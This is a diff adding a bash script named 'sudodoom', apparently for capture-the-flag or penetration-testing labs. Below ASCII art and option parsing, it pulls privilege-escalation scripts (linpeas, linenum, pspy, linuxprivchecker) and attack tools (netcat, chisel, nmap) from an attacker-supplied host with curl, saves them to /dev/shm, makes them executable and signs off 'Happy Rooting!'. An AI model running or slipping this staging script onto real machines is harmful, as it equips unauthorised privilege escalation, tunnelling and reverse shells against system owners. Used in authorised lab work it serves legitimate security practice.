@@ -1,0 +1,92 @@
+#!/bin/bash
+echo "                           ,--."
+echo "                          {    }"
+echo "                          K,   }"
+echo "                         /  ~Y/"
+echo "                    \,   /   /"
+echo "                   {_\'-K.__/"
+echo "                     \/-.__/._"
+echo "                     /  ' /\`\_}"
+echo "                    /  ' /"
+echo "        ________   /  ' /"
+echo "     ,-'        ~~/  ' /_"
+echo "   ,'             ``\~~~  ',"
+echo " ____  _   _ ____   ___   (Y"
+echo "/ ___|| | | |  _ \ / _ \  { I"
+echo "\___ \| | | | | | | | | |{  \`,"
+echo " ___) | |_| | |_| | |_| ||', )"
+echo "|____/ \___/|____/ \___/| |_ )"
+echo "|    .,_./  Y ' / ^Y   J   )|"
+echo "\           |' /   |   |   ||"
+echo " \          L_/    . _ (_,.'("
+echo "  \,   ,      ^^\' \' / |    )"
+echo "    \\_  \\          /,L]    /"
+echo "      '-_~-,       ` `      ./\`"
+echo "         \`'{_            )\'"
+echo "             ^^\..___,.--\`"
+
+help() {
+	echo
+	echo "Usage: ./sudodoom -i <IP> -p <port>"
+	echo
+	echo "-h		display help message"
+	echo "-i		Localhost IP"
+	echo "-p		Localhost port"
+	echo
+	echo "ex: ./sudodoom -i 10.10.14.6 -p 8080"
+	exit 0
+}
+
+while getopts "hi:p:" option; do
+	case $option in
+		h) # display Help
+			help
+			exit;;
+		i) # lhost
+			ip=$OPTARG
+			;;
+		p) # port
+			port=$OPTARG
+			;;
+		\?) #Invalid option
+			echo
+			 echo -e "\e[31m[!]\e[0m Unknown flag"
+			 echo -e "\e[31m[!]\e[0m Run ./sudodoom -h for help"
+			exit;;
+	esac
+done
+
+if [ $# -eq 0 ]
+then
+	echo
+	echo
+    echo -e "\e[31m[!]\e[0m Missing options!"
+    echo -e "\e[31m[!]\e[0m Run ./sudodoom -h for help"
+    echo ""
+    exit 0
+fi
+
+echo -e "\e[34m[+]\e[0m Downloading privilege escaltion scripts from $ip:$port to /dev/shm"
+echo
+curl $ip:$port/linpeas.sh -o /dev/shm/linpeas.sh 
+curl $ip:$port/linenum.sh -o /dev/shm/linenum.sh 
+curl $ip:$port/pspy -o /dev/shm/pspy 
+curl $ip:$port/linuxprivchecker.py -o /dev/shm/linuxprivchecker.py 
+curl $ip:$port/nc -o /dev/shm/nc
+curl $ip:$port/chisel -o /dev/shm/chisel
+curl $ip:$port/nmap -o /dev/shm/nmap
+sleep 1.5
+echo
+echo -e "\e[34m[+]\e[0m Adding execute permissions..."
+chmod +x /dev/shm/linpeas.sh
+chmod +x /dev/shm/linenum.sh
+chmod +x /dev/shm/pspy
+chmod +x /dev/shm/nc
+chmod +x /dev/shm/chisel
+chmod +x /dev/shm/nmap
+sleep 1
+echo
+ls -la /dev/shm
+echo
+echo -e "\e[34m[+]\e[0m Happy Rooting! <3"
+echo
